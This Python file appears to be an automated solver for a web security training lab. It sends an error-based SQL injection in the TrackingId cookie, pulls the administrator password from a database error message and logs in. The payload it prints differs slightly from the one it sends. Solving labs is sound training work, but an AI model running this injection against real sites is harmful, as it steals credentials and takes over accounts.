from rich import print

from services.sql_injection.base_sql_injection import SQLInjectionBaseSolver

class ErrorBasedSolver(SQLInjectionBaseSolver):
    def __init__(self, URL):
        super().__init__(URL)
        url = f"{self.url}/login"
        self._request_lab('GET', url)
        self.session = self.html_content.cookies.get('session')
        self.password = None

    def solve(self):
        """Solve the lab."""
        self.custom_payload()
        self.request_login(allow_redirects=False)
        self._print_solved()

    def custom_payload(self):
        """Build the payload."""
        self.spinner.start()
        self.spinner.text = "Start Attack"
        cookies = {
                    'session': self.session,
                    'TrackingId': f"' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--"
                }
        url = f"{self.url}"
        self._request_lab('GET', url, cookies=cookies)
        self.spinner.stop()
        self.spinner.clear()
        self._print_payload(f"' AND 1=CAST((SELECT password FROM users) AS INT LIMIT 1)--")
        self.password = self.soup_html.find('p', class_='is-warning').text.split(': ')[2].replace('"', '')
        print(f"[bold blue]Password:[/bold blue] {self.password}")
        self.list_users = {"administrator": self.password}